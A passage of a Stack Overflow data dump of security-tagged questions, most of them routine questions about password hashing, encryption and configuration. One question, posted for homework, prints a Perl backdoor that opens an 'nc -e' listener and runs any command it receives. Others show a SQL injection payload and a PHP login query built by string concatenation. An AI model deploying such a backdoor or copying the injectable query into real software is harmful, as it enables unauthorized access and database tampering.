grasp the concept. Thank you.</p>\n"},{"tags":["linux","security","passwords"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":13063119,"title":"My unix machine is accessed remotely without a passowrd","body":"<p>I was trying to download from my own Linux machine remotely from another computer but to my dismay I found out that my Linux machine is not secured and I can access it without a password. How can I fix it so that it must ask a password when it is accessed remotely.</p>\n\n<p>Regards\nYacob</p>\n"},{"tags":["android","security","credit-card","keystore"],"answer_count":3,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":83,"score":5,"question_id":13047475,"title":"Is it secure that store creadit card info on android?","body":"<p>In my approach, at first time user wants to pay by credit card, he must reenter his login password and full credit card info.</p>\n\n<p>after success paid, I generate a random key, pack it as a keystore, finally store keystore file at internal storage, this keystore file is locked by user's login password. on the other hand, credit card info will be encrypted by this key and turn into a Base64 encoded string, finally write into a file in internal storage.</p>\n\n<p>at next time pay by credit card, user also must reenter his login password, so I can use it to unlock the keystore file and extract key. at this point, I has ability to decrypt user's credit card info.</p>\n\n<p>above is my approach to secure credit card info stored on device, is it secure?</p>\n"},{"tags":["perl","security","system-calls","netcat"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":38,"score":-1,"question_id":13061216,"title":"Perl script making call to itself (through nc -e) is failing. Claiming no such file/dir","body":"<p>We have been asked to set up a backdoor in a victim machine for a homework assignment. I've gained access to the machine and I want to have the following script run on a <code>cron</code>, but it's throwing an error.</p>\n\n<p>I've verified that the <code>@ARGV</code> test works correctly by calling the program independently with and without the dummy <code>run</code> argument, but when I try and <code>netcat</code> into the victim machine on <code>port 35898</code> after initializing the script, the following error is all I get on connection.</p>\n\n<p><strong>Error:</strong> <code>exec /bin/vshell run failed : No such file or directory</code></p>\n\n<p>Obviously the program exists because the program is calling itself.</p>\n\n<p><strong>Code:</strong></p>\n\n<pre><code>#!/usr/bin/perl -w\n\n$| = 1;\nmy $prompt = '$ ';\n\n# run is just a dummy arg\nif(!@ARGV){ exec(\"nc -e '/bin/vshell run' -l -p 35898\"); die; }\n\nwhile(1){\n  print $prompt;\n  eval {\n    local $SIG{ALRM} = sub { die 'Goodbye!\\n'; };\n\n    alarm 60;\n    &amp;syscall;\n    alarm 0;\n  };\n  if( $@ ){ die; }\n}\n\nsub syscall{\n  if( defined( $_ = &lt;STDIN&gt; )){\n    chomp;\n    system( $_ );\n  }\n}\n</code></pre>\n\n<p>I've been at this for a while and I could really use a nudge in the right direction. Thanks!</p>\n\n<p>PS: This install of <code>nc</code> is compiled with the security hole which allows the <code>-e</code> flag and I have verified this functionality on other programs.</p>\n"},{"tags":["java","c++","web-services","security","gsoap"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":240,"score":1,"question_id":9670106,"title":"How to consume a Java Metro Web Service using Username Authentication with a Symmetric key in a Gsoap client?","body":"<p>I am doing research on interoperability between secure web services. The security has to be done on the message level ONLY. So far I have managed to get WCF and WSIT/Metro working together using certificates. Now I am trying to do the same thing using gSoap, but so far I have had no luck.</p>\n\n<p>I have succesfully managed to generate a header file from the Java service WSDL using wsdl2h and I was able to generate the necessary classes using soapcpp2. By following the gsoap documentation, the WSSE and WSA plugins <em>should</em> be configured correctly and indeed if I do some sniffing in Wireshark, I see that the Gsoap client sends a request with a security header and the WS-Addressing fields (To, Action, MessageID, ReplyTo). </p>\n\n<p>The Java service is configured to use Username Authentication with a Symmetric Key using the 3DES algorithm, username authentication token and a Lax security header layout.</p>\n\n<p>The certificates are in the Glassfish keystore and truststore and have been exported and converted to PEM files for usage in gSoap.</p>\n\n<p>This is my code for the C++ application:</p>\n\n<pre><code>    #include &lt;cstdlib&gt;\n    #include &lt;iostream&gt;\n    #include \"soapNewWebServicePortBindingProxy.h\"\n    #include \"NewWebServicePortBinding.nsmap\"\n    #include \"wsseapi.h\"\n    #include \"wsaapi.h\"\n\n    using namespace std;\n\n    /*\n     * \n     */\n    int main(int argc, char** argv) {\n        static char DES_KEY[20] =\n        { 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1 };\n        /* SET UP */\n        NewWebServicePortBinding proxy;\n        proxy.soap = soap_new1(SOAP_XML_CANONICAL | SOAP_XML_INDENT);\n        soap_register_plugin(proxy.soap, soap_wsa);\n        soap_register_plugin(proxy.soap, soap_wsse);  \n        ns1__hello req;\n        ns1__helloResponse resp;\n        req.name = new std::string(\"derpenstein\");  \n\n        /* ADD WS-SECURITY ELEMENTS  */    \n        soap_wsse_add_Security(proxy.soap);\n        soap_wsse_add_Signature(proxy.soap);\n        soap_wsse_add_Timestamp(proxy.soap, NULL, 300);\n\n        //OpenSSL_add_all_algorithms();\n        FILE *fd = fopen(\"gsoappublic.pem\", \"r\");\n        FILE *fpriv = fopen(\"gsoapprivate.pem\", \"r\");\n\n        X509 *cert = PEM_read_X509(fd, NULL, NULL, NULL);\n\n        EVP_PKEY *privkey = NULL;\n        EVP_PKEY *pubkey = NULL;\n\n        privkey = PEM_read_PrivateKey(fpriv, NULL, NULL, (void*)\"changeit\");\n\n        if (!privkey) {\n            cout &lt;&lt; \"error getting private key\" &lt;&lt; endl;\n            ERR_print_errors_fp(stderr);\n            return -1;\n        }\n\n        pubkey = X509_get_pubkey(cert);\n        if (!pubkey) {\n            cout &lt;&lt; \"error getting public key from certificate\" &lt;&lt; endl;\n        }\n        fclose(fd);\n        fclose(fpriv);\n\n        if (soap_wsse_encrypt_body(proxy.soap, SOAP_MEC_ENC_DES_CBC, DES_KEY, sizeof(DES_KEY))\n         || soap_wsse_add_EncryptedKey(proxy.soap, \"Cert\", cert, NULL)\n         || soap_wsse_add_UsernameTokenText(proxy.soap, \"User\", \"test\", \"test\")\n         || soap_wsse_sign_body(proxy.soap, SOAP_SMD_SIGN_RSA_SHA1, privkey, 0)\n         || soap_wsse_add_BinarySecurityTokenX509(proxy.soap, \"X509Token\", cert)\n         || soap_wsse_add_KeyInfo_SecurityTokenReferenceX509(proxy.soap, \"#X509Token\")){\n            soap_print_fault(proxy.soap, stderr);\n        }\n\n        /* ADD WS-ADDRESSING */\n        soap_wsse_set_wsu_id(proxy.soap, \"wsa5:From wsa5:To wsa5:ReplyTo wsa5:FaultTo wsa5:Action\");  \n        if (soap_wsa_request(proxy.soap, \"uuid:5012354ad\", \"http://belgianguypc:8080/NewSecureService/NewWebService\", \"http://newsec.mince.org/NewWebService/helloRequest\")\n            || soap_wsa_add_ReplyTo(proxy.soap, \"http://www.w3.org/2005/08/addressing/anonymous\")) {\n            soap_print_fault(proxy.soap, stderr);\n        }\n\n\n        /* MAKE THE CALL */\n        int err = proxy.__ns1__hello(&amp;req, &amp;resp);\n        if (err == SOAP_OK) {\n            cout &lt;&lt; \"Success!\";\n            cout &lt;&lt; resp.return_;\n        }\n        else {\n            cout &lt;&lt; \"When sending:\" &lt;&lt; endl;\n            soap_print_fault(proxy.soap, stderr);\n            return -1;\n        }\n\n        return 0;\n    }\n</code></pre>\n\n<p>As far as I am aware, what I am doing is adding the timestamp, the certificate, the username and password, then I encrypt the body with a dummy DES key and I sign the message with my own private key. Then I make the call...</p>\n\n<p>However this is not working, what I get as output is:</p>\n\n<pre><code>When sending:\nSOAP 1.1 Fault: wsse:FailedCheck [no subcode]\n\"WSS1927: Error occurred while decrypting EncryptedKey\"\nDetail: [no detail]\n</code></pre>\n\n<p>GlassFish gives a stack trace:</p>\n\n<pre><code>SEVERE: WSS1913: Key used to decrypt EncryptedKey cannot be null\nSEVERE: WSS1927: Error occured while decrypting EncryptedKey\nSEVERE: WSITPVD0035: Error in Verifying Security in Inbound Message.\ncom.sun.xml.wss.impl.WssSoapFaultException: WSS1927: Error occured while decrypting EncryptedKey\n    at com.sun.xml.ws.security.opt.impl.util.SOAPUtil.newSOAPFaultException(SOAPUtil.java:158)\n    at com.sun.xml.ws.security.opt.impl.incoming.EncryptedKey.getKey(EncryptedKey.java:354)\n    at com.sun.xml.ws.security.opt.impl.incoming.KeySelectorImpl.resolveDirectReference(KeySelectorImpl.java:628)\n    at com.sun.xml.ws.security.opt.impl.incoming.processor.SecurityTokenProcessor.processDirectReference(SecurityTokenProcessor.java:267)\n    at com.sun.xml.ws.security.opt.impl.incoming.processor.SecurityTokenProcessor.resolveReference(SecurityTokenProcessor.java:143)\n    at com.sun.xml.ws.security.opt.impl.incoming.processor.KeyInfoProcessor.processKeyInfo(KeyInfoProcessor.java:152)\n    at com.sun.xml.ws.security.opt.impl.incoming.processor.KeyInfoProcessor.getKey(KeyInfoProcessor.java:132)\n    at com.sun.xml.ws.security.opt.impl.incoming.EncryptedData.process(EncryptedData.java:156)\n    at com.sun.xml.ws.security.opt.impl.incoming.EncryptedData.&lt;init&gt;(EncryptedData.java:113)\n    at com.sun.xml.ws.security.opt.impl.incoming.SecurityRecipient.createMessage(SecurityRecipient.java:791)\n    at com.sun.xml.ws.security.opt.impl.incoming.SecurityRecipient.validateMessage(SecurityRecipient.java:232)\n    at com.sun.xml.wss.provider.wsit.WSITServerAuthContext.verifyInboundMessage(WSITServerAuthContext.java:586)\n    at com.sun.xml.wss.provider.wsit.WSITServerAuthContext.validateRequest(WSITServerAuthContext.java:360)\n    at com.sun.xml.wss.provider.wsit.WSITServerAuthContext.validateRequest(WSITServerAuthContext.java:263)\n    at com.sun.enterprise.security.webservices.CommonServerSecurityPipe.processRequest(CommonServerSecurityPipe.java:173)\n    at com.sun.enterprise.security.webservices.CommonServerSecurityPipe.process(CommonServerSecurityPipe.java:144)\n    at com.sun.xml.ws.api.pipe.helper.PipeAdapter.processRequest(PipeAdapter.java:119)\n    at com.sun.xml.ws.api.pipe.Fiber.__doRun(Fiber.java:641)\n    at com.sun.xml.ws.api.pipe.Fiber._doRun(Fiber.java:600)\n    at com.sun.xml.ws.api.pipe.Fiber.doRun(Fiber.java:585)\n    at com.sun.xml.ws.api.pipe.Fiber.runSync(Fiber.java:482)\n    at com.sun.xml.ws.server.WSEndpointImpl$2.process(WSEndpointImpl.java:314)\n    at com.sun.xml.ws.transport.http.HttpAdapter$HttpToolkit.handle(HttpAdapter.java:608)\n    at com.sun.xml.ws.transport.http.HttpAdapter.handle(HttpAdapter.java:259)\n    at com.sun.xml.ws.transport.http.servlet.ServletAdapter.handle(ServletAdapter.java:162)\n    at org.glassfish.webservices.JAXWSServlet.doPost(JAXWSServlet.java:145)\n    at javax.servlet.http.HttpServlet.service(HttpServlet.java:754)\n    at javax.servlet.http.HttpServlet.service(HttpServlet.java:847)\n    at org.apache.catalina.core.StandardWrapper.service(StandardWrapper.java:1539)\n    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:281)\n    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:175)\n    at org.apache.catalina.core.StandardPipeline.doInvoke(StandardPipeline.java:655)\n    at org.apache.catalina.core.StandardPipeline.invoke(StandardPipeline.java:595)\n    at com.sun.enterprise.web.WebPipeline.invoke(WebPipeline.java:98)\n    at com.sun.enterprise.web.PESessionLockingStandardPipeline.invoke(PESessionLockingStandardPipeline.java:91)\n    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:162)\n    at org.apache.catalina.connector.CoyoteAdapter.doService(CoyoteAdapter.java:330)\n    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:231)\n    at com.sun.enterprise.v3.services.impl.ContainerMapper.service(ContainerMapper.java:232)\n    at com.sun.grizzly.http.ProcessorTask.invokeAdapter(ProcessorTask.java:828)\n    at com.sun.grizzly.http.ProcessorTask.doProcess(ProcessorTask.java:725)\n    at com.sun.grizzly.http.ProcessorTask.process(ProcessorTask.java:1019)\n    at com.sun.grizzly.http.DefaultProtocolFilter.execute(DefaultProtocolFilter.java:225)\n    at com.sun.grizzly.DefaultProtocolChain.executeProtocolFilter(DefaultProtocolChain.java:137)\n    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:104)\n    at com.sun.grizzly.DefaultProtocolChain.execute(DefaultProtocolChain.java:90)\n    at com.sun.grizzly.http.HttpProtocolChain.execute(HttpProtocolChain.java:79)\n    at com.sun.grizzly.ProtocolChainContextTask.doCall(ProtocolChainContextTask.java:54)\n    at com.sun.grizzly.SelectionKeyContextTask.call(SelectionKeyContextTask.java:59)\n    at com.sun.grizzly.ContextTask.run(ContextTask.java:71)\n    at com.sun.grizzly.util.AbstractThreadPool$Worker.doWork(AbstractThreadPool.java:532)\n    at com.sun.grizzly.util.AbstractThreadPool$Worker.run(AbstractThreadPool.java:513)\n    at java.lang.Thread.run(Unknown Source)\nCaused by: java.io.IOException: Key used to decrypt EncryptedKey cannot be null\n    at com.sun.xml.ws.security.opt.impl.enc.CryptoProcessor.decryptKey(CryptoProcessor.java:346)\n    at com.sun.xml.ws.security.opt.impl.incoming.EncryptedKey.getKey(EncryptedKey.java:351)\n    ... 51 more\n</code></pre>\n\n<p>I suppose the root of the problem is that the EncryptedKey is null according to the service but I have no idea which key that would be or why it would be null.</p>\n\n<p>So my question is: is it possible to consume a secure Metro service from Gsoap, if so what am I doing wrong? What am I missing?</p>\n\n<p>Thanks!</p>\n"},{"tags":["java","jquery","ajax","security","servlets"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":67,"score":-1,"question_id":13058210,"title":"Is it secure to pass a password to Java from Jquery ajax callback in plain text?","body":"<p>Or do I need to encrypt it first.  I'm using a password text field, grabbing it with </p>\n\n<pre><code>var pwd = $(\"#userpassword\").val();\n</code></pre>\n\n<p>and then</p>\n\n<pre><code>$.post('JavaServlet', { formData: formData, pwd: pwd, date: date }, function(data) {\n</code></pre>\n\n<p>The java piece encrypts it and stores it in the ldap.<br>\nIf you suggest to encrypt, please suggest the best way to accomplish the task. \nThanks in advance!</p>\n\n<p>Answer:  We are using SSL. So it seems redundant to encrypt the password.</p>\n"},{"tags":["javascript","security","cross-domain","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":49,"score":2,"question_id":13060344,"title":"understanding JavaScript security model","body":"<p>Why is it that I can submit a form to an iframe with a cross-domain address but can't send an XMLHTTPRequest to that address?</p>\n"},{"tags":["security","encryption","hash","brute-force"],"answer_count":8,"favorite_count":19,"up_vote_count":45,"down_vote_count":0,"view_count":5964,"score":45,"question_id":213380,"title":"The necessity of hiding the salt for a hash","body":"<p>At work we have two competing theories for salts.  The products I work on use something like a user name or phone number to salt the hash.  Essentially something that is different for each user but is readily available to us.  The other product randomly generates a salt for each user and changes each time the user changes the password.  The salt is then encrypted in the database.</p>\n\n<p>My question is if the second approach is really necessary?  I can understand from a purely theoretical perspective that it is more secure than the first approach, but what about from a practicality point of view.  Right now to authenticate a user, the salt must be unencrypted and applied to the login information.  </p>\n\n<p>After thinking about it, I just don't see a real security gain from this approach.  Changing the salt from account to account, still makes it extremely difficult for someone to attempt to brute force the hashing algorithm even if the attacker was aware of how to quickly determine what it was for each account.  This is going on the assumption that the  passwords are sufficiently strong.  (Obviously finding the correct hash for a set of passwords where they are all two digits is significantly easier than finding the correct hash of passwords which are 8 digits).  Am I incorrect in my logic, or is there something that I am missing?</p>\n\n<p><strong>EDIT:</strong> Okay so here's the reason why I think it's really moot to encrypt the salt.  (lemme know if I'm on the right track).  </p>\n\n<p>For the following explanation, we'll assume that the passwords are always 8 characters and the salt is 5 and all passwords are comprised of lowercase letters (it just makes the math easier).</p>\n\n<p>Having a different salt for each entry means that I can't use the same rainbow table (actually technically I could if I had one of sufficient size, but let's ignore that for the moment).  This is the real key to the salt from what I understand, because to crack every account I have to reinvent the wheel so to speak for each one.  Now if I know how to apply the correct salt to a password to generate the hash, I'd do it because a salt really just extends the length/complexity of the hashed phrase.  So I would be cutting the number of possible combinations I would need to generate to \"know\" I have the password + salt from 13^26 to 8^26 because I know what the salt is.  Now that makes it easier, but still really hard.  </p>\n\n<p>So onto encrypting the salt.  If I know the salt is encrypted, I wouldn't try and decrypt (assuming I know it has a sufficient level of encryption) it first.  I would ignore it.  Instead of trying to figure out how to decrypt it, going back to the previous example I would just generate a larger rainbow table containing all keys for the 13^26.  Not knowing the salt would definitely slow me down, but I don't think it would add the monumental task of trying to crack the salt encryption first.  That's why I don't think it's worth it.  Thoughts?</p>\n\n<p>Here is a link describing how long passwords will hold up under a brute force attack:\n<a href=\"http://www.lockdown.co.uk/?pg=combi\" rel=\"nofollow\">http://www.lockdown.co.uk/?pg=combi</a></p>\n"},{"tags":["ruby-on-rails","ruby","security","sql-injection"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13058981,"title":"Sql Injection Prevention and Converting Data in Rails","body":"<p>I noticed in the Ruby on Rails Guide that this is considered correct format</p>\n\n<pre><code>Client.where(\"orders_count = ?\", params[:orders])\n</code></pre>\n\n<p>whereas later on they used</p>\n\n<pre><code>Client.where(:created_at =&gt; (params[:start_date].to_date)..(params[:end_date].to_date))\n</code></pre>\n\n<p>My question is, is it safe to assume that using the <code>.to_</code> method will be secure enough against sql injection?</p>\n"},{"tags":["security","encryption","hash","salt"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13052882,"title":"Password Security: Encrypting salt","body":"<p>I'm new to security and trying to understand why encrypting or hiding a salt is not considered useful. I've read the earlier post <a href=\"http://stackoverflow.com/questions/213380/the-necessity-of-hiding-the-salt-for-a-hash\">The necessity of hiding the salt for a hash</a> on why hiding or encrypting salt is unnecessary but the answer was based off the assumption  </p>\n\n<blockquote>\n  <p>If someone has access to your database, then they have access to the\n  encrypted salts, and they probably have access to your code as well</p>\n</blockquote>\n\n<p><strong>Question</strong></p>\n\n<p>Just because an attacker has access to your database why should we assume he has access to the code interacting with it? For example, you have your salted passwords on a MySQL server on one machine along with the encrypted salts. And you have the key for decrypting the salts or some intricate encryption/decryption logic on a web server on a separate machine. An attacker gains access to the database via SQL injection or some other means. Hasn't the encryption and distributed architecture saved the day here?</p>\n"},{"tags":["c#","asp.net-mvc","security","asp.net-membership"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":50,"score":2,"question_id":13034869,"title":"Use ASP.NET Membership e Profile in ASP.NET MVC 3","body":"<p>I use classic ASP.NET Membership Provider in my ASP.NET MVC 3 application. When I validate user by Membership.Validate() method, I set the value in FormsAuthentication.SetAuthCookie() for persistent login during the navigation of the web site, but when i try to call the HttpContext.User.Identify.Name i get a String Empty value. Where is the problem? </p>\n\n<p>P.S. In the past, i used the ASP.NET Web Forms Access Controls to do this job that automatize this mecanism. </p>\n"},{"tags":["security","encryption","standards"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13056727,"title":"Encrypting data via client or server or both?","body":"<p>I have a question concerning data encryption. My question is where do I encrypt the data and why?</p>\n\n<p>FOR REGISTERING</p>\n\n<p>I currently encrypt data in an application/game and send the data to the server to add or update to the database. </p>\n\n<p>FOR SIGNING IN</p>\n\n<p>I ask the server to send me data regarding a username including the password. So I receive the  encrypted password and the username and decrypt the password to see if it matches what the player had inputted.</p>\n\n<p>MY CONCERN</p>\n\n<p>My concern is that someone could intercept what gets sent out and compare it to what they inputted as a password. </p>\n\n<p>My idea for a solution would be to encrypt data on the server as well, but that would only be useful if the server/database was hacked.</p>\n\n<p>I couldn't find anything really specific to my question. I've found articles concerning how to encrypting data, but nothing of the risks and security holes.</p>\n\n<p>I'm also wondering what the standards are concerning this along with the risks of different methods.</p>\n\n<p>EDIT:\nI Fear I am over thinking this, but felt it would be safer to ask. </p>\n\n<p>I haven't provided what methods of encrypting data I use because I don't know if that could be a security risk.</p>\n"},{"tags":["web-services","security","mobile","azure","titanium"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":13055695,"title":"Best practices for securing mobile apps that use web services","body":"<p>I am developing apps using Appcelerator Titanium and they integrate with our web service which is hosted in Windows Azure. I need to know what are the most common attacks and what are some best practices to protect against them? I would need you to guide me to some good resources .</p>\n\n<p>Thank you</p>\n"},{"tags":["security","web-security","csrf","hacking","csrf-protection"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":13051114,"title":"If your site doesn't use cookies do you still need to worry about CSRF protection?","body":"<p>I have been reading up on CSRF/XSRF a bit and a lot of it seems to talk about cookies as they can be involved in logging the user back in automatically.</p>\n\n<p>So I was just wondering if your site doesn't use cookies, do you still need to worry about using it or do you need to worry about using it on public accessible forms?</p>\n\n<p>I assume you still do as the user could already be logged in within the browser and then they could be exposed to it.</p>\n\n<p>As for public forms, obviously the only reason you would want protection on these is if you didn't want remote sites posting to them correct!?</p>\n"},{"tags":["php","security","hash","mysqli"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":13054152,"title":"Passoword hashes don't match, what am I doing wrong?","body":"<p>I have this method for hashing a password when I register a user at my website. It works perfectly from what I can tell, I store the $password_hash and $salt in my database. But the problems happen when I try to authenticate the user for login, the hashes I get don't match.</p>\n\n<p><strong>Register function</strong></p>\n\n<pre><code>    $salt = createSalt();\n    $password = createPassword();\n    $hash = hash('sha256', $password);\n    $password_hash = hash('sha256', $salt . $hash);\n</code></pre>\n\n<p><strong>Login Function</strong> </p>\n\n<pre><code>    $query = \"SELECT Password_Hash,Salt FROM accounts WHERE Email = ' \".$email.\" ' \";\n    $result = mysqli_query($mysqli, $query);\n    $rows = mysqli_fetch_assoc($result);\n    $hash = hash('sha256', $password);\n    $password_hash = hash('sha256', $rows['Salt'] . $hash);\n</code></pre>\n\n<p><strong>Create Password Function</strong></p>\n\n<pre><code>   function createPassword()\n   { /*This function is used to create the password for the user */\n     $alphabet = \"abcdefghijklmnopqrstuwxyzABCDEFGHIJKLMNOPQRSTUWXYZ0123456789\";\n     for ($i = 0; $i &lt; 8; $i++) \n      {\n        $n = rand(0, strlen($alphabet)-1);\n        $pass[$i] = $alphabet[$n];\n      }\n    return implode($pass);\n   }\n</code></pre>\n\n<p>The two password hashes to not match is there something I'm doing wrong? Image below of the output. The first line is the DB output\n<img src=\"http://i.stack.imgur.com/4h2nb.png\" alt=\"enter image description here\"></p>\n"},{"tags":["php","mysql","security","xss"],"answer_count":6,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":472,"score":5,"question_id":2965430,"title":"Preventing server-side scripting, XSS","body":"<p>Are there any pre-made scripts that I can use for PHP / MySQL to prevent server-side scripting and JS injections?</p>\n\n<p>I know about the typical functions such as htmlentities, special characters, string replace etc. but is there a simple bit of code or a function that is a failsafe for everything?</p>\n\n<p>Any ideas would be great. Many thanks :)</p>\n\n<p><strong>EDIT:</strong> Something generic that strips out anything that could be hazardous, ie. greater than / less than signs, semi-colons, words like \"DROP\", etc?</p>\n\n<p>I basically just want to compress everything to be alphanumeric, I guess...?</p>\n"},{"tags":["facebook","ipad","security","safari"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13054602,"title":"iPad/Safari Facebook Login Photo Verification","body":"<p>All,</p>\n\n<p>I work with a social media company and recently experienced something very vexing at a live event.</p>\n\n<p>We have visitors sign in temporarily on iPad kiosks for registration purposes to their facebook account (via Safari).</p>\n\n<p>Unfortunately, I am not within proximity/access of our iPads at present and won't be until the next live event. I am hoping to not have to sneak out and buy/borrow an iPad just to get to the bottom of this.</p>\n\n<p>Basically when we use my company's iPads (which were set up a few months back prior to me joining the company), Facebook login works just fine. User inputs username/password, hits login, they are immediately prompted to authorize our application. However, when we use the third party's iPads, almost every single time, Facebook initiates an unregistered device issue and forces the captcha + Photo Verification/ID process in order to complete the login process.</p>\n\n<p>I did a variety of tests that ensured this was in no way related to a) our ISP/IP; b) our Facebook app c) incorrect credentials being entered; d) individual account security settings. The jist of those tests centered around using the same account on one of my company's iPads, then one of the third party's iPads. I've narrowed it down to being a local device setting, I think. However, I did not have time to go through the iPad + Safari settings such as private browsing etc.</p>\n\n<p>As a QA person, I am fully aware that my next step would have been to compare the settings of our functional iPads to theirs which end up with the verification issue. That being said, all the equipment had to be packed up and sent on the road before I could complete my testing.</p>\n\n<p>So, if anyone has specific experience related to this sort of issue (Facebook login verification) I'd really appreciate any tips that you can provide to make sure users are not prompted for excessive security verifications, as it slows down our registration process in an unacceptable manner.</p>\n\n<p>Kindly, Dave</p>\n"},{"tags":["security","svg"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":21,"score":2,"question_id":13054510,"title":"Does Inkscape's --vacuum-defs make SVGs truly safe?","body":"<p>We are considering allowing user uploaded SVGs in our web app. We've been hesitant to do this before, due to a large number of complex vulnerabilities that we know exist in untrusted SVGs. A coworker found the --vacuum-defs option to Inkscape, and believes that it renders all untrusted SVGS safe for processing.</p>\n\n<p>According to the manpage, that option \"Removes all unused items from the  section of the SVG file. If this option is invoked in conjunction with --export-plain-svg, only the exported file will be affected. If it is used alone, the specified file will be modified in place.\" However, according to my coworker, \"Scripting is removed, XML transformations are removed, malformations are not tolerated, encoding is removed and external imports are removed. </p>\n\n<p>Is this true? If so, is it enough that we should feel safe accepting untrusted SVGs? Is there any other preprocessing we should do?</p>\n"},{"tags":["security","twitter","hacking"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":21,"score":-1,"question_id":13053804,"title":"are Twitter usernames a security vulnerability?","body":"<p>Twitter usernames are exposed to everyone. Isn't this a security vulnerability?\nand simplifies password cracking? Did Twitter do something about that?</p>\n"},{"tags":["security","validation","sql-injection"],"answer_count":14,"favorite_count":74,"up_vote_count":253,"down_vote_count":15,"view_count":18977,"score":238,"question_id":332365,"title":"XKCD SQL injection  please explain","body":"<p>Just looking at:</p>\n\n<p><img src=\"http://imgs.xkcd.com/comics/exploits_of_a_mom.png\" alt=\"XKCD Strip\" title=\"Her daughter is named Help I'm trapped in a driver's license factory.\">\n<em>(Source: <a href=\"http://xkcd.com/327/\">http://xkcd.com/327/</a>)</em></p>\n\n<p>What does this SQL do:</p>\n\n<pre><code>Robert'); DROP\nTABLE STUDENTS; --\n</code></pre>\n\n<p>I know both <code>'</code> and <code>--</code> are for comments, but doesn't the word <code>DROP</code> get commented as well since it is part of the same line?</p>\n"},{"tags":["php","security","rest","web"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":61,"score":2,"question_id":13052424,"title":"Transmit user password for a rest api","body":"<p>I'm designing a REST API and I have some problems in terms of security for authenticating the user.\nFor authentication I don't want the password to be send across the network in plain text.</p>\n\n<p>To bypass this problem I could send a SHA-256 hash of the password (with the username as salt), so the password is never sent in plain text. In my database I will be storing the following hashes: SHA256(password + salt) and I'll compare if both of the hashes match.</p>\n\n<p>The problem with this option is that I'll have a hash computed with a fast hash algorithm and the salt is not random.</p>\n\n<p>In security the best practice is to use a slow signature algorithm, with a random salt (like bcrypt).</p>\n\n<p>The slow algorithm is not a problem, i could use bcrypt on the client side, but for the salt i don't know what to do:</p>\n\n<ul>\n<li>Bcrypt need a salt with a defined size so i can't put the username</li>\n<li>If i'm using a random salt, how the client will know the value of this salt before computing the password's hash?</li>\n</ul>\n\n<p>So i can see 3 options, but none are sastisfying:</p>\n\n<ul>\n<li>I send the password in plain text (I'm using SSL) and i store bcrypt in the db => still vulnerable to man in the middle</li>\n<li>I use SHA256 and send the hash where the salt is the username (still using SSL) => the hash in the db are less secure</li>\n<li>I use bcrypt and I have a two step process: i ask for the saltfor a given user and then send the hash of this user (still using ssl) => by trying to log in with an other username i can obtain his salt, not awesome</li>\n</ul>\n\n<p>Is anybody has a better solution or some advices?</p>\n"},{"tags":["security","symfony2"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13049518,"title":"symfony2 - security.yml","body":"<p>I have the following code that returns the error:</p>\n\n<blockquote>\n  <p>FileLoaderLoadException: Cannot import resource \"C:\\wamp\\www\\NewSchool\\app/config\\security.yml\" from \"C:\\wamp\\www\\NewSchool\\app/config\\config.yml\".</p>\n</blockquote>\n\n<p>Code:</p>\n\n<pre class=\"lang-yml prettyprint-override\"><code>security:\n Symfony\\Component\\Security\\Core\\User\\User: plaintext\n NewSchool\\DatabaseBundle\\Entity\\Student:\n   algorithm: sha1\n   encode_as_base64: false\n   iterations: 1\n NewSchool\\DatabaseBundle\\Entity\\Teacher:\n   algorithm: sha1\n   encode_as_base64: false\n   iterations: 1\n NewSchool\\DatabaseBundle\\Entity\\Parrent:\n        algorithm: sha1\n        encode_as_base64: false\n        iterations: 1\n NewSchool\\DatabaseBundle\\Entity\\Admin:\n        algorithm: sha1\n        encode_as_base64: false\n        iterations: 1\n\nrole_hierarchy:\n    ROLE_STUDENT:   ROLE_USER\n    ROLE_TEACHER:   ROLE_USER\n    ROLE_PARRENT:   ROLE_USER\n    ROLE_ADMIN:     ROLE_USER\n    ROLE_SUPERADMIN: [ROLE_USER, ROLE_STUDENT, ROLE_TEACHER, ROLE_PARRENT, ROLE_ADMIN, ROLE_ALLOWED_TO_SWITCH]\n\n providers:\n         chain_providers:\n             providers:  [students, teachers, parrents, admins ]\n         students:\n             entity: { class: NewSchoolDatabaseBundle:Student, property: username }\n         teachers:\n             entity: { class: NewSchoolDatabaseBundle:Teacher, property: username }\n         parrents:\n             entity: { class: NewSchoolDatabaseBundle:Parrent, property: username }\n         admins:\n             entity: { class: NewSchoolDatabaseBundle:Admin, property: username }\n         in_memory:\n             users:\n                 student:  { password: studentpass, roles: [ 'ROLE_STUDENT' ] }\n                 teacher:  { password: 